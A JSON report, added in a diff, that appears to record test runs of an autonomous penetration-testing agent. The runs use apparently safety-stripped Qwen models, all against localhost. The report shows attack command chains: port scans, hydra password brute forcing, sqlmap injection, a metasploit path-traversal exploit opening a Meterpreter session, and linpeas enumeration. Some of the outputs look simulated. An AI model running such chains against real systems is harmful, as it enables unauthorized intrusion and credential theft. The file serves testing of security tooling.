@@ -1,0 +1,547 @@
+{
+  "generatedAt": "2026-07-05T15:12:44-0700",
+  "ok": true,
+  "proofLevel": "existing-live-artifact-ordered-transcript-backed",
+  "proofType": "chained-tool-workflow",
+  "requirement": "Autonomous tool proof must show ordered multi-tool chains plus final model continuation, not only individual per-tool evidence.",
+  "rowCount": 5,
+  "rows": [
+    {
+      "artifact": "docs/live-proofs/2026-07-04-real-installed-tools-loopback.json",
+      "cacheProof": {
+        "blockL2Tokens": 0,
+        "hybridSSM": false,
+        "paged": false,
+        "prefix": false,
+        "q4KV": false,
+        "schedulerCachedTokens": 0
+      },
+      "failures": [],
+      "finalMarker": "REAL_INSTALLED_TOOLS_FINAL",
+      "finalMarkerAfterChain": true,
+      "id": "real_installed_loopback_chain",
+      "model": null,
+      "observedTools": [
+        "nmap",
+        "httpx",
+        "nuclei",
+        "hydra",
+        "netexec",
+        "linpeas",
+        "run_shell",
+        "run_shell"
+      ],
+      "orderedPositions": [
+        0,
+        1,
+        2,
+        3,
+        4,
+        5,
+        6,
+        7
+      ],
+      "requiredTools": [
+        "nmap",
+        "httpx",
+        "nuclei",
+        "hydra",
+        "netexec",
+        "linpeas",
+        "run_shell",
+        "run_shell"
+      ],
+      "status": "PASS",
+      "toolCallPreviews": [
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -p 52689 -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : \"52689\",\n  \"service_detection\" : true,\n  \"target\" : \"127.0.0.1\"\n}\n\n# Nmap 7.99 scan initiated Sat Jul  4 07:50:26 2026 as: /opt/homebrew/bin/nmap -p 52689 -sV -oN - 127.0.0.1\nNmap scan report for loca",
+          "index": 2,
+          "status": "ok 6.1s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: httpx\n$ /bin/sh -c echo 'http://127.0.0.1:52689/httpx' | tr ',' '\\n' | httpx -sc -title -tech-detect -json -silent -duc -timeout 5 2>/dev/null || curl -s -o /dev/null -w '{\"url\":\"http://127.0.0.1:52689/httpx\",\"status_code\":%{http_code},\"title\":\"\",\"webserver\":\"%{cont",
+          "index": 3,
+          "status": "ok 0.2s",
+          "tool": "httpx"
+        },
+        {
+          "contentPreview": "Tool request: nuclei\n$ nuclei -u http://127.0.0.1:52689 -t /var/folders/8x/q1k_20mj5w3bzpx5c_psg3800000gn/T/exploitbot-real-installed-tools-home-16y4ouhj/.exploitbot/nuclei-templates/exploitbot-loopback.yaml -jsonl -silent\nArguments:\n{\n  \"target\" : \"http:\\/\\/127.0.0.1:52689\",\n  \"",
+          "index": 4,
+          "status": "ok 8.9s",
+          "tool": "nuclei"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P /var/folders/8x/q1k_20mj5w3bzpx5c_psg3800000gn/T/exploitbot-real-installed-tools-home-16y4ouhj/.exploitbot/hydra-passwords.txt -s 52689 -V -f 127.0.0.1 http-get /protected\nArguments:\n{\n  \"password_file\" : \"\\/var\\/folders\\/8x\\/q1k_20mj5w3bzp",
+          "index": 5,
+          "status": "ok 0.3s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1 --no-progress --shares --timeout 2 --smb-timeout 2\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : true,\n  \"smb_timeout\" : 2,\n  \"target\" : \"127.0.0.1\",\n  \"timeout\" : 2\n}\n\nSMB                      127.0.0.1       445    ERICS-M5-MAX2  ",
+          "index": 6,
+          "status": "ok 0.7s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh -q -N -o system_information\nArguments:\n{\n  \"flags\" : \"-q -N -o system_information\"\n}\n\n\n\n          MacPEAS-ng by carlospolop\n\nADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of ",
+          "index": 7,
+          "status": "ok 13.9s",
+          "tool": "linpeas"
+        },
+        {
+          "contentPreview": "Tool request: run_shell\n$ /bin/zsh -c curl -sS -i 'http://127.0.0.1:52689/proof?tool=curl'\nArguments:\n{\n  \"command\" : \"curl -sS -i 'http:\\/\\/127.0.0.1:52689\\/proof?tool=curl'\"\n}\n\nHTTP/1.1 200 OK\r\nServer: BaseHTTP/0.6 Python/3.14.6\r\nDate: Sat, 04 Jul 2026 14:50:56 GMT\r\nContent-Typ",
+          "index": 8,
+          "status": "ok 0.0s",
+          "tool": "run_shell"
+        },
+        {
+          "contentPreview": "Tool request: run_shell\n$ /bin/zsh -c printf 'GET /proof?tool=nc HTTP/1.1\\r\\nHost: 127.0.0.1:52689\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 52689\nArguments:\n{\n  \"command\" : \"printf 'GET \\/proof?tool=nc HTTP\\/1.1\\\\r\\\\nHost: 127.0.0.1:52689\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n' |",
+          "index": 9,
+          "status": "ok 0.0s",
+          "tool": "run_shell"
+        }
+      ]
+    },
+    {
+      "artifact": "docs/live-proofs/2026-07-04-real-qwen-real-tools-loopback-27b.json",
+      "cacheProof": {
+        "blockL2Tokens": 12529,
+        "hybridSSM": true,
+        "paged": true,
+        "prefix": true,
+        "q4KV": true,
+        "schedulerCachedTokens": 12529
+      },
+      "failures": [],
+      "finalMarker": "REAL_QWEN_REAL_TOOLS_FINAL",
+      "finalMarkerAfterChain": true,
+      "id": "qwen27_real_installed_loopback_chain",
+      "model": "/Users/eric/models/dealign.ai/Qwen3.6-27B-MXFP8-CRACK-MTP",
+      "observedTools": [
+        "nmap",
+        "httpx",
+        "nuclei",
+        "hydra",
+        "netexec",
+        "linpeas",
+        "run_shell",
+        "run_shell"
+      ],
+      "orderedPositions": [
+        0,
+        1,
+        2,
+        3,
+        4,
+        5,
+        6,
+        7
+      ],
+      "requiredTools": [
+        "nmap",
+        "httpx",
+        "nuclei",
+        "hydra",
+        "netexec",
+        "linpeas",
+        "run_shell",
+        "run_shell"
+      ],
+      "status": "PASS",
+      "toolCallPreviews": [
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -p 50273 -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : 50273,\n  \"service_detection\" : \"True\",\n  \"target\" : \"127.0.0.1\"\n}\n\n# Nmap 7.99 scan initiated Sat Jul  4 07:28:04 2026 as: /opt/homebrew/bin/nmap -p 50273 -sV -oN - 127.0.0.1\nNmap scan report for loca",
+          "index": 2,
+          "status": "ok 6.1s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: httpx\n$ /bin/sh -c echo 'http://127.0.0.1:50273/httpx' | tr ',' '\\n' | httpx -sc -title -tech-detect -json -silent -duc -timeout 5 2>/dev/null || curl -s -o /dev/null -w '{\"url\":\"http://127.0.0.1:50273/httpx\",\"status_code\":%{http_code},\"title\":\"\",\"webserver\":\"%{cont",
+          "index": 3,
+          "status": "ok 0.3s",
+          "tool": "httpx"
+        },
+        {
+          "contentPreview": "Tool request: nuclei\n$ nuclei -u http://127.0.0.1:50273 -t /var/folders/8x/q1k_20mj5w3bzpx5c_psg3800000gn/T/exploitbot-real-qwen-real-tools-home-z6tajp6z/.exploitbot/nuclei-templates/exploitbot-loopback.yaml -jsonl -silent\nArguments:\n{\n  \"target\" : \"http:\\/\\/127.0.0.1:50273\",\n  \"",
+          "index": 4,
+          "status": "ok 9.3s",
+          "tool": "nuclei"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P /var/folders/8x/q1k_20mj5w3bzpx5c_psg3800000gn/T/exploitbot-real-qwen-real-tools-home-z6tajp6z/.exploitbot/hydra-passwords.txt -s 50273 -V -f 127.0.0.1 http-get /protected\nArguments:\n{\n  \"password_file\" : \"\\/var\\/folders\\/8x\\/q1k_20mj5w3bzp",
+          "index": 5,
+          "status": "ok 0.3s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1 --no-progress --timeout 2 --smb-timeout 2\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : \"True\",\n  \"smb_timeout\" : 2,\n  \"target\" : \"127.0.0.1\",\n  \"timeout\" : 2\n}\n\nSMB                      127.0.0.1       445    ERICS-M5-MAX2    [*] W",
+          "index": 6,
+          "status": "ok 0.8s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh -q -N -o system_information\nArguments:\n{\n  \"flags\" : \"-q -N -o system_information\"\n}\n\n\n\n          MacPEAS-ng by carlospolop\n\nADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of ",
+          "index": 7,
+          "status": "ok 14.6s",
+          "tool": "linpeas"
+        },
+        {
+          "contentPreview": "Tool request: run_shell\n$ /bin/zsh -c curl -sS -i 'http://127.0.0.1:50273/proof?tool=curl'\nArguments:\n{\n  \"command\" : \"curl -sS -i 'http:\\/\\/127.0.0.1:50273\\/proof?tool=curl'\"\n}\n\nHTTP/1.1 200 OK\r\nServer: BaseHTTP/0.6 Python/3.14.6\r\nDate: Sat, 04 Jul 2026 14:28:36 GMT\r\nContent-Typ",
+          "index": 8,
+          "status": "ok 0.0s",
+          "tool": "run_shell"
+        },
+        {
+          "contentPreview": "Tool request: run_shell\n$ /bin/zsh -c printf 'GET /proof?tool=nc HTTP/1.1\\r\\nHost: 127.0.0.1:50273\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 50273\nArguments:\n{\n  \"command\" : \"printf 'GET \\/proof?tool=nc HTTP\\/1.1\\\\r\\\\nHost: 127.0.0.1:50273\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n' |",
+          "index": 9,
+          "status": "ok 0.0s",
+          "tool": "run_shell"
+        }
+      ]
+    },
+    {
+      "artifact": "docs/live-proofs/2026-07-04-real-qwen-real-tools-loopback-35b.json",
+      "cacheProof": {
+        "blockL2Tokens": 12580,
+        "hybridSSM": true,
+        "paged": true,
+        "prefix": true,
+        "q4KV": true,
+        "schedulerCachedTokens": 12580
+      },
+      "failures": [],
+      "finalMarker": "REAL_QWEN_REAL_TOOLS_FINAL",
+      "finalMarkerAfterChain": true,
+      "id": "qwen35_real_installed_loopback_chain",
+      "model": "/Users/eric/models/dealign.ai/Qwen3.6-35B-A3B-MXFP8-CRACK-MTP",
+      "observedTools": [
+        "nmap",
+        "httpx",
+        "nuclei",
+        "hydra",
+        "netexec",
+        "linpeas",
+        "run_shell",
+        "run_shell"
+      ],
+      "orderedPositions": [
+        0,
+        1,
+        2,
+        3,
+        4,
+        5,
+        6,
+        7
+      ],
+      "requiredTools": [
+        "nmap",
+        "httpx",
+        "nuclei",
+        "hydra",
+        "netexec",
+        "linpeas",
+        "run_shell",
+        "run_shell"
+      ],
+      "status": "PASS",
+      "toolCallPreviews": [
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -p 51778 -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : 51778,\n  \"service_detection\" : \"True\",\n  \"target\" : \"127.0.0.1\"\n}\n\n# Nmap 7.99 scan initiated Sat Jul  4 07:38:06 2026 as: /opt/homebrew/bin/nmap -p 51778 -sV -oN - 127.0.0.1\nNmap scan report for loca",
+          "index": 2,
+          "status": "ok 6.1s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: httpx\n$ /bin/sh -c echo 'http://127.0.0.1:51778/httpx' | tr ',' '\\n' | httpx -sc -title -tech-detect -json -silent -duc -timeout 5 2>/dev/null || curl -s -o /dev/null -w '{\"url\":\"http://127.0.0.1:51778/httpx\",\"status_code\":%{http_code},\"title\":\"\",\"webserver\":\"%{cont",
+          "index": 3,
+          "status": "ok 0.2s",
+          "tool": "httpx"
+        },
+        {
+          "contentPreview": "Tool request: nuclei\n$ nuclei -u http://127.0.0.1:51778 -t /var/folders/8x/q1k_20mj5w3bzpx5c_psg3800000gn/T/exploitbot-real-qwen-real-tools-home-0y7lcs8h/.exploitbot/nuclei-templates/exploitbot-loopback.yaml -jsonl -silent\nArguments:\n{\n  \"target\" : \"http:\\/\\/127.0.0.1:51778\",\n  \"",
+          "index": 4,
+          "status": "ok 9.4s",
+          "tool": "nuclei"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P /var/folders/8x/q1k_20mj5w3bzpx5c_psg3800000gn/T/exploitbot-real-qwen-real-tools-home-0y7lcs8h/.exploitbot/hydra-passwords.txt -s 51778 -V -f 127.0.0.1 http-get /protected\nArguments:\n{\n  \"password_file\" : \"\\/var\\/folders\\/8x\\/q1k_20mj5w3bzp",
+          "index": 5,
+          "status": "ok 0.3s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1 --no-progress --timeout 2 --smb-timeout 2\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : \"True\",\n  \"smb_timeout\" : 2,\n  \"target\" : \"127.0.0.1\",\n  \"timeout\" : 2\n}\n\nSMB                      127.0.0.1       445    ERICS-M5-MAX2    [*] W",
+          "index": 6,
+          "status": "ok 0.6s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh -q -N -o system_information\nArguments:\n{\n  \"flags\" : \"-q -N -o system_information\"\n}\n\n\n\n          MacPEAS-ng by carlospolop\n\nADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of ",
+          "index": 7,
+          "status": "ok 12.0s",
+          "tool": "linpeas"
+        },
+        {
+          "contentPreview": "Tool request: run_shell\n$ /bin/zsh -c curl -sS -i 'http://127.0.0.1:51778/proof?tool=curl'\nArguments:\n{\n  \"command\" : \"curl -sS -i 'http:\\/\\/127.0.0.1:51778\\/proof?tool=curl'\"\n}\n\nHTTP/1.1 200 OK\r\nServer: BaseHTTP/0.6 Python/3.14.6\r\nDate: Sat, 04 Jul 2026 14:38:35 GMT\r\nContent-Typ",
+          "index": 8,
+          "status": "ok 0.0s",
+          "tool": "run_shell"
+        },
+        {
+          "contentPreview": "Tool request: run_shell\n$ /bin/zsh -c printf 'GET /proof?tool=nc HTTP/1.1\\r\\nHost: 127.0.0.1:51778\\r\\nConnection: close\\r\\n\\r\\n' | nc 127.0.0.1 51778\nArguments:\n{\n  \"command\" : \"printf 'GET \\/proof?tool=nc HTTP\\/1.1\\\\r\\\\nHost: 127.0.0.1:51778\\\\r\\\\nConnection: close\\\\r\\\\n\\\\r\\\\n' |",
+          "index": 9,
+          "status": "ok 0.0s",
+          "tool": "run_shell"
+        }
+      ]
+    },
+    {
+      "artifact": "docs/live-proofs/2026-07-04-real-qwen-autonomous-phase-27b.json",
+      "cacheProof": {
+        "blockL2Tokens": 8190,
+        "hybridSSM": true,
+        "paged": true,
+        "prefix": true,
+        "q4KV": true,
+        "schedulerCachedTokens": 8190
+      },
+      "failures": [],
+      "finalMarker": "REAL_QWEN_PHASE_FINAL",
+      "finalMarkerAfterChain": true,
+      "id": "qwen27_phase_chain",
+      "model": "/Users/eric/models/dealign.ai/Qwen3.6-27B-MXFP8-CRACK-MTP",
+      "observedTools": [
+        "nmap",
+        "netexec",
+        "sqlmap",
+        "hydra",
+        "metasploit",
+        "linpeas",
+        "nmap",
+        "netexec",
+        "sqlmap",
+        "hydra",
+        "metasploit",
+        "linpeas"
+      ],
+      "orderedPositions": [
+        0,
+        1,
+        2,
+        3,
+        4,
+        5
+      ],
+      "requiredTools": [
+        "nmap",
+        "netexec",
+        "sqlmap",
+        "hydra",
+        "metasploit",
+        "linpeas"
+      ],
+      "status": "PASS",
+      "toolCallPreviews": [
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : 443,\n  \"service_detection\" : \"True\",\n  \"target\" : \"127.0.0.1\"\n}\n\n443/tcp open https Apache httpd 2.4.49\n",
+          "index": 2,
+          "status": "ok 0.0s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : \"True\",\n  \"target\" : \"127.0.0.1\"\n}\n\nSMB 127.0.0.1 445 QA-SMB [*] Windows Server 2019 signing:false\n",
+          "index": 3,
+          "status": "ok 0.0s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: sqlmap\n$ sqlmap -u http://127.0.0.1/login?id=1 --batch\nArguments:\n{\n  \"dbs\" : \"True\",\n  \"url\" : \"http:\\/\\/127.0.0.1\\/login?id=1\"\n}\n\nGET parameter 'id' is vulnerable. injectable boolean-based blind SQL injection\n",
+          "index": 4,
+          "status": "ok 0.0s",
+          "tool": "sqlmap"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P qa-passwords.txt -V -f 127.0.0.1 ssh\nArguments:\n{\n  \"password_file\" : \"qa-passwords.txt\",\n  \"protocol\" : \"ssh\",\n  \"target\" : \"127.0.0.1\",\n  \"username\" : \"admin\"\n}\n\n[22][ssh] host: 127.0.0.1   login: admin   password: Password123!\n",
+          "index": 5,
+          "status": "ok 0.0s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: metasploit\n$ msfconsole -q -x use exploit/multi/http/apache_path_traversal; set RHOSTS 127.0.0.1; run\nArguments:\n{\n  \"command\" : \"use exploit\\/multi\\/http\\/apache_path_traversal; set RHOSTS 127.0.0.1; run\"\n}\n\nexploit/multi/http/apache_path_traversal\nMeterpreter sess",
+          "index": 6,
+          "status": "ok 0.0s",
+          "tool": "metasploit"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh -q\nArguments:\n{\n  \"flags\" : \"-q\"\n}\n\nHostname: qa-linux-01\nUser: www-data\n",
+          "index": 7,
+          "status": "ok 0.0s",
+          "tool": "linpeas"
+        },
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : 443,\n  \"service_detection\" : \"True\",\n  \"target\" : \"127.0.0.1\"\n}\n\n443/tcp open https Apache httpd 2.4.49\n",
+          "index": 11,
+          "status": "ok 0.0s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : \"True\",\n  \"target\" : \"127.0.0.1\"\n}\n\nSMB 127.0.0.1 445 QA-SMB [*] Windows Server 2019 signing:false\n",
+          "index": 12,
+          "status": "ok 0.0s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: sqlmap\n$ sqlmap -u http://127.0.0.1/login?id=1 --batch\nArguments:\n{\n  \"dbs\" : \"True\",\n  \"url\" : \"http:\\/\\/127.0.0.1\\/login?id=1\"\n}\n\nGET parameter 'id' is vulnerable. injectable boolean-based blind SQL injection\n",
+          "index": 13,
+          "status": "ok 0.0s",
+          "tool": "sqlmap"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P qa-passwords.txt -V -f 127.0.0.1 ssh\nArguments:\n{\n  \"password_file\" : \"qa-passwords.txt\",\n  \"protocol\" : \"ssh\",\n  \"target\" : \"127.0.0.1\",\n  \"username\" : \"admin\"\n}\n\n[22][ssh] host: 127.0.0.1   login: admin   password: Password123!\n",
+          "index": 14,
+          "status": "ok 0.0s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: metasploit\n$ msfconsole -q -x use exploit/multi/http/apache_path_traversal; set RHOSTS 127.0.0.1; run\nArguments:\n{\n  \"command\" : \"use exploit\\/multi\\/http\\/apache_path_traversal; set RHOSTS 127.0.0.1; run\"\n}\n\nexploit/multi/http/apache_path_traversal\nMeterpreter sess",
+          "index": 15,
+          "status": "ok 0.0s",
+          "tool": "metasploit"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh -q\nArguments:\n{\n  \"flags\" : \"-q\"\n}\n\nHostname: qa-linux-01\nUser: www-data\n",
+          "index": 16,
+          "status": "ok 0.0s",
+          "tool": "linpeas"
+        }
+      ]
+    },
+    {
+      "artifact": "docs/live-proofs/2026-07-04-real-qwen-autonomous-phase-35b.json",
+      "cacheProof": {
+        "blockL2Tokens": 13257,
+        "hybridSSM": true,
+        "paged": true,
+        "prefix": true,
+        "q4KV": true,
+        "schedulerCachedTokens": 13257
+      },
+      "failures": [],
+      "finalMarker": "REAL_QWEN_PHASE_FINAL",
+      "finalMarkerAfterChain": true,
+      "id": "qwen35_phase_chain",
+      "model": "/Users/eric/models/dealign.ai/Qwen3.6-35B-A3B-MXFP8-CRACK-MTP",
+      "observedTools": [
+        "nmap",
+        "netexec",
+        "sqlmap",
+        "hydra",
+        "metasploit",
+        "linpeas",
+        "nmap",
+        "netexec",
+        "sqlmap",
+        "hydra",
+        "metasploit",
+        "linpeas"
+      ],
+      "orderedPositions": [
+        0,
+        1,
+        2,
+        3,
+        4,
+        5
+      ],
+      "requiredTools": [
+        "nmap",
+        "netexec",
+        "sqlmap",
+        "hydra",
+        "metasploit",
+        "linpeas"
+      ],
+      "status": "PASS",
+      "toolCallPreviews": [
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : 443,\n  \"service_detection\" : true,\n  \"target\" : \"127.0.0.1\"\n}\n\n443/tcp open https Apache httpd 2.4.49\n",
+          "index": 2,
+          "status": "ok 0.0s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1 --shares\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : true,\n  \"target\" : \"127.0.0.1\"\n}\n\nSMB 127.0.0.1 445 QA-SMB [*] Windows Server 2019 signing:false\n",
+          "index": 3,
+          "status": "ok 0.0s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: sqlmap\n$ sqlmap -u http://127.0.0.1/login?id=1 --batch\nArguments:\n{\n  \"batch\" : true,\n  \"url\" : \"http:\\/\\/127.0.0.1\\/login?id=1\"\n}\n\nGET parameter 'id' is vulnerable. injectable boolean-based blind SQL injection\n",
+          "index": 4,
+          "status": "ok 0.0s",
+          "tool": "sqlmap"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P qa-passwords.txt -V -f 127.0.0.1 ssh\nArguments:\n{\n  \"password_file\" : \"qa-passwords.txt\",\n  \"protocol\" : \"ssh\",\n  \"target\" : \"127.0.0.1\",\n  \"username\" : \"admin\"\n}\n\n[22][ssh] host: 127.0.0.1   login: admin   password: Password123!\n",
+          "index": 5,
+          "status": "ok 0.0s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: metasploit\n$ msfconsole -q -x \nArguments:\n{\n  \"module\" : \"exploit\\/multi\\/http\\/apache_path_traversal\",\n  \"target\" : \"127.0.0.1\"\n}\n\nexploit/multi/http/apache_path_traversal\nMeterpreter session 7 opened (127.0.0.1:4444 -> 127.0.0.1:49158)\n",
+          "index": 6,
+          "status": "ok 0.0s",
+          "tool": "metasploit"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh\nArguments:\n{\n  \"target\" : \"127.0.0.1\"\n}\n\nHostname: qa-linux-01\nUser: www-data\n",
+          "index": 7,
+          "status": "ok 0.0s",
+          "tool": "linpeas"
+        },
+        {
+          "contentPreview": "Tool request: nmap\n$ nmap -sV -oN - 127.0.0.1\nArguments:\n{\n  \"ports\" : 443,\n  \"service_detection\" : true,\n  \"target\" : \"127.0.0.1\"\n}\n\n443/tcp open https Apache httpd 2.4.49\n",
+          "index": 11,
+          "status": "ok 0.0s",
+          "tool": "nmap"
+        },
+        {
+          "contentPreview": "Tool request: netexec\n$ netexec smb 127.0.0.1 --shares\nArguments:\n{\n  \"protocol\" : \"smb\",\n  \"shares\" : true,\n  \"target\" : \"127.0.0.1\"\n}\n\nSMB 127.0.0.1 445 QA-SMB [*] Windows Server 2019 signing:false\n",
+          "index": 12,
+          "status": "ok 0.0s",
+          "tool": "netexec"
+        },
+        {
+          "contentPreview": "Tool request: sqlmap\n$ sqlmap -u http://127.0.0.1/login?id=1 --batch\nArguments:\n{\n  \"batch\" : true,\n  \"url\" : \"http:\\/\\/127.0.0.1\\/login?id=1\"\n}\n\nGET parameter 'id' is vulnerable. injectable boolean-based blind SQL injection\n",
+          "index": 13,
+          "status": "ok 0.0s",
+          "tool": "sqlmap"
+        },
+        {
+          "contentPreview": "Tool request: hydra\n$ hydra -l admin -P qa-passwords.txt -V -f 127.0.0.1 ssh\nArguments:\n{\n  \"password_file\" : \"qa-passwords.txt\",\n  \"protocol\" : \"ssh\",\n  \"target\" : \"127.0.0.1\",\n  \"username\" : \"admin\"\n}\n\n[22][ssh] host: 127.0.0.1   login: admin   password: Password123!\n",
+          "index": 14,
+          "status": "ok 0.0s",
+          "tool": "hydra"
+        },
+        {
+          "contentPreview": "Tool request: metasploit\n$ msfconsole -q -x \nArguments:\n{\n  \"module\" : \"exploit\\/multi\\/http\\/apache_path_traversal\",\n  \"target\" : \"127.0.0.1\"\n}\n\nexploit/multi/http/apache_path_traversal\nMeterpreter session 7 opened (127.0.0.1:4444 -> 127.0.0.1:49158)\n",
+          "index": 15,
+          "status": "ok 0.0s",
+          "tool": "metasploit"
+        },
+        {
+          "contentPreview": "Tool request: linpeas\n$ linpeas.sh\nArguments:\n{\n  \"target\" : \"127.0.0.1\"\n}\n\nHostname: qa-linux-01\nUser: www-data\n",
+          "index": 16,
+          "status": "ok 0.0s",
+          "tool": "linpeas"
+        }
+      ]
+    }
+  ],
+  "statusCounts": {
+    "FAIL": 0,
+    "PASS": 5
+  }
+}
